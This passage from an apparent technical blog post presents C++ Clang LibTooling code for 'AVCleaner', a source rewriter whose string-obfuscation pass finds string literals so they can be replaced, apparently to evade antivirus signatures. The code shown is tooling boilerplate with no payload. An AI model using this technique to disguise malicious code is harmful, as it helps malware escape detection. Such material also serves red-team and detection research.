        </span></span><span class="kwd"><span class="kwd">bool</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">BeginSourceFileAction</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">CompilerInstance</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="typ"><span class="typ">Compiler</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">override</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
            llvm</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">outs</span></span><span class="pun"><span class="pun">()</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"Processing file "</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">'\n'</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
            </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">true</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
        </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

        </span></span><span class="kwd"><span class="kwd">void</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">EndSourceFileAction</span></span><span class="pun"><span class="pun">()</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">override</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

            clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">SourceManager</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="pln"><span class="pln">SM </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ASTRewriter</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">getSourceMgr</span></span><span class="pun"><span class="pun">();</span></span><span class="pln"><span class="pln">

            std</span></span><span class="pun"><span class="pun">::</span></span><span class="kwd"><span class="kwd">string</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">FileName</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> SM</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">getFileEntryForID</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">SM</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">getMainFileID</span></span><span class="pun"><span class="pun">())-&gt;</span></span><span class="pln"><span class="pln">getName</span></span><span class="pun"><span class="pun">();</span></span><span class="pln"><span class="pln">
            llvm</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">errs</span></span><span class="pun"><span class="pun">()</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"** EndSourceFileAction for: "</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">FileName</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"\n"</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">

            </span></span><span class="com"><span class="com">// Now emit the rewritten buffer.</span></span><span class="pln"><span class="pln">
            llvm</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">errs</span></span><span class="pun"><span class="pun">()</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"Here is the edited source file :\n\n"</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
            std</span></span><span class="pun"><span class="pun">::</span></span><span class="kwd"><span class="kwd">string</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">TypeS</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
            llvm</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">raw_string_ostream s</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">TypeS</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
            </span></span><span class="kwd"><span class="kwd">auto</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">FileID</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> SM</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">getMainFileID</span></span><span class="pun"><span class="pun">();</span></span><span class="pln"><span class="pln">
            </span></span><span class="kwd"><span class="kwd">auto</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ReWriteBuffer</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ASTRewriter</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">getRewriteBufferFor</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">FileID</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">

            </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">ReWriteBuffer</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">!=</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">nullptr</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln">
                </span></span><span class="typ"><span class="typ">ReWriteBuffer</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">write</span></span><span class="pun"><span class="pun">((</span></span><span class="pln"><span class="pln">s</span></span><span class="pun"><span class="pun">));</span></span><span class="pln"><span class="pln">
            </span></span><span class="kwd"><span class="kwd">else</span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
                llvm</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">errs</span></span><span class="pun"><span class="pun">()</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"File was not modified\n"</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
                </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
            </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

            std</span></span><span class="pun"><span class="pun">::</span></span><span class="kwd"><span class="kwd">string</span></span><span class="pln"><span class="pln"> result </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> s</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">str</span></span><span class="pun"><span class="pun">();</span></span><span class="pln"><span class="pln">
            std</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">ofstream fo</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">FileName</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
       
            </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">fo</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">is_open</span></span><span class="pun"><span class="pun">())</span></span><span class="pln"><span class="pln">
                fo </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> result</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
            </span></span><span class="kwd"><span class="kwd">else</span></span><span class="pln"><span class="pln">
                llvm</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">errs</span></span><span class="pun"><span class="pun">()</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"[!] Error saving result to "</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">FileName</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"\n"</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
        </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

</span></span><span class="kwd"><span class="kwd">auto</span></span><span class="pln"><span class="pln"> main</span></span><span class="pun"><span class="pun">(</span></span><span class="kwd"><span class="kwd">int</span></span><span class="pln"><span class="pln"> argc</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="pln"><span class="pln">argv</span></span><span class="pun"><span class="pun">[])</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">int</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">using</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">namespace</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">tooling</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
    </span></span><span class="kwd"><span class="kwd">using</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">namespace</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ClSetup</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">

    </span></span><span class="typ"><span class="typ">CommonOptionsParser</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">OptionsParser</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">argc</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> argv</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ToolCategory</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
    </span></span><span class="typ"><span class="typ">ClangTool</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Tool</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">OptionsParser</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">getCompilations</span></span><span class="pun"><span class="pun">(),</span></span><span class="pln"><span class="pln">
                   </span></span><span class="typ"><span class="typ">OptionsParser</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">getSourcePathList</span></span><span class="pun"><span class="pun">());</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">auto</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Action</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> newFrontendActionFactory</span></span><span class="pun"><span class="pun">&lt;</span></span><span class="typ"><span class="typ">StringEncryptor</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">Action</span></span><span class="pun"><span class="pun">&gt;();</span></span><span class="pln"><span class="pln">
    </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Tool</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">run</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">Action</span></span><span class="pun"><span class="pun">.</span></span><span class="kwd"><span class="kwd">get</span></span><span class="pun"><span class="pun">());</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">}</span></span></code></pre>



<p>Since that boilerplate code is taken from examples in the official documentation, there is no need to describe it further. In fact, the only modification worth mentioning is inside <em>CreateASTConsumer</em>. Our end game is to run several tranformation passes on the same translation unit. It can be done by adding items to the <em>consumers</em> collection (the essential line is <code class="hljs gherkin prettyprinted" style=""><span class="pln">consumers</span><span class="pun">.</span><span class="pln">push_back</span><span class="pun">(&amp;...);</span></code>).</p>



<h3 class="wp-block-heading">String obfuscation</h3>



<p>This section describes the most important implementation details regarding the string obfuscation pass, which comprises three steps:</p>



<ul class="wp-block-list">
<li>Locate string literals in the source code.</li>



<li>Replace them with variables</li>



<li>Insert a variable definition / assignment at the appropriate location (enclosing function or global context).</li>
</ul>



<h4 class="wp-block-heading">Locating string literals in source code</h4>



<p><em>StringConsumer</em> can be defined as follows (at the beginning of the <em>StringEncryptor</em> namespace):</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="kwd"><span class="kwd">class</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">StringEncryptionConsumer</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">:</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">public</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">ASTConsumer</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">public</span></span><span class="pun"><span class="pun">:</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">void</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">HandleTranslationUnit</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">ASTContext</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="typ"><span class="typ">Context</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">override</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
        </span></span><span class="kwd"><span class="kwd">using</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">namespace</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">ast_matchers</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
        </span></span><span class="kwd"><span class="kwd">using</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">namespace</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">StringEncryptor</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">

        llvm</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">outs</span></span><span class="pun"><span class="pun">()</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"[StringEncryption] Registering ASTMatcher...\n"</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
        </span></span><span class="typ"><span class="typ">MatchFinder</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Finder</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
        </span></span><span class="typ"><span class="typ">MatchHandler</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Handler</span></span><span class="pun"><span class="pun">(&amp;</span></span><span class="typ"><span class="typ">ASTRewriter</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">

        </span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">auto</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Matcher</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> stringLiteral</span></span><span class="pun"><span class="pun">().</span></span><span class="pln"><span class="pln">bind</span></span><span class="pun"><span class="pun">(</span></span><span class="str"><span class="str">"decl"</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">

        </span></span><span class="typ"><span class="typ">Finder</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">addMatcher</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">Matcher</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="typ"><span class="typ">Handler</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
        </span></span><span class="typ"><span class="typ">Finder</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">matchAST</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">Context</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">

</span></span><span class="typ"><span class="typ">StringEncryptionConsumer</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">StringConsumer</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">StringEncryptionConsumer</span></span><span class="pun"><span class="pun">();</span></span></code></pre>



<p>Given a translation unit, we can tell <em>Clang</em> to find a pattern inside the AST, as well as register a “handler” to be called whenever a match is found. The pattern matching exposed by <em>Clang’s</em> <em><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a></em> is quite powerful, and yet underused here, since we only resort to it to locate string literals.</p>



<p>Then, we can get to the heart of the matter by implementing a <em>MatchHandler</em>, which will provide us with a <em><a href="https://clang.llvm.org/doxygen/structclang_1_1ast__matchers_1_1MatchFinder_1_1MatchResult.html#ab06481084c7027e5779a5a427596f66c">MatchResult</a></em> instance. A <em><a href="https://clang.llvm.org/doxygen/structclang_1_1ast__matchers_1_1MatchFinder_1_1MatchResult.html#ab06481084c7027e5779a5a427596f66c">MatchResult</a></em> contains a reference to the AST node identified, as well as priceless context information.</p>



<p>Let us implement the class definition and inherit some good stuff from <em><a href="https://clang.llvm.org/doxygen/classclang_1_1ast__matchers_1_1MatchFinder_1_1MatchCallback.html">clang::ast_matchers::MatchFinder::MatchCallback</a></em>:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="com"><span class="com">#ifndef</span></span><span class="pln"><span class="pln"> AVCLEANER_MATCHHANDLER_H
</span></span><span class="com"><span class="com">#define</span></span><span class="pln"><span class="pln"> AVCLEANER_MATCHHANDLER_H

</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">&lt;vector&gt;</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">&lt;string&gt;</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">&lt;memory&gt;</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"llvm/Support/raw_ostream.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"llvm/Support/CommandLine.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"llvm/ADT/StringRef.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"llvm/ADT/ArrayRef.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/Rewrite/Core/Rewriter.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/Tooling/Tooling.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/Tooling/CommonOptionsParser.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/Frontend/FrontendAction.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/Frontend/CompilerInstance.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/Basic/SourceManager.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/ASTMatchers/ASTMatchers.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/ASTMatchers/ASTMatchFinder.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/AST/Type.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/AST/Decl.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/AST/ASTContext.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/AST/ASTConsumer.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"MatchHandler.h"</span></span><span class="pln"><span class="pln">

</span></span><span class="kwd"><span class="kwd">class</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">MatchHandler</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">:</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">public</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">ast_matchers</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">MatchFinder</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">MatchCallback</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

</span></span><span class="kwd"><span class="kwd">public</span></span><span class="pun"><span class="pun">:</span></span><span class="pln"><span class="pln">
    </span></span><span class="kwd"><span class="kwd">using</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">MatchResult</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">ast_matchers</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">MatchFinder</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">MatchResult</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">

    </span></span><span class="typ"><span class="typ">MatchHandler</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">Rewriter</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="pln"><span class="pln">rewriter</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
    </span></span><span class="kwd"><span class="kwd">void</span></span><span class="pln"><span class="pln"> run</span></span><span class="pun"><span class="pun">(</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">MatchResult</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="typ"><span class="typ">Result</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">override</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln"> </span></span><span class="com"><span class="com">// callback function that runs whenever a Match is found.</span></span><span class="pln"><span class="pln">

</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">

</span></span><span class="com"><span class="com">#endif</span></span><span class="pln"><span class="pln"> </span></span><span class="com"><span class="com">//AVCLEANER_MATCHHANDLER_H</span></span></code></pre>



<p>In <em>MatchHandler.cpp</em>, we will have to implement MatchHandler’s constructor and the <em>run</em> callback function. The constructor is pretty simple, since it is only needed to store the <em><a href="https://clang.llvm.org/doxygen/classclang_1_1Rewriter.html">clang::Rewriter</a></em>‘s instance for later use:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="kwd"><span class="kwd">using</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">namespace</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">

</span></span><span class="typ"><span class="typ">MatchHandler</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">MatchHandler</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">Rewriter</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="pln"><span class="pln">rewriter</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
    </span></span><span class="kwd"><span class="kwd">this</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="typ"><span class="typ">ASTRewriter</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> rewriter</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">}</span></span></code></pre>



<p><em>run</em> is implemented as follows:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="kwd"><span class="kwd">void</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">MatchHandler</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">run</span></span><span class="pun"><span class="pun">(</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">MatchResult</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="typ"><span class="typ">Result</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
    </span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">auto</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="typ"><span class="typ">Decl</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Result</span></span><span class="pun"><span class="pun">.</span></span><span class="typ"><span class="typ">Nodes</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">getNodeAs</span></span><span class="pun"><span class="pun">&lt;</span></span><span class="pln"><span class="pln">clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">StringLiteral</span></span><span class="pun"><span class="pun">&gt;(</span></span><span class="str"><span class="str">"decl"</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
    clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">SourceManager</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="pln"><span class="pln">SM </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ASTRewriter</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getSourceMgr</span></span><span class="pun"><span class="pun">();</span></span><span class="pln"><span class="pln">

    </span></span><span class="com"><span class="com">// skip strings in included headers</span></span><span class="pln"><span class="pln">
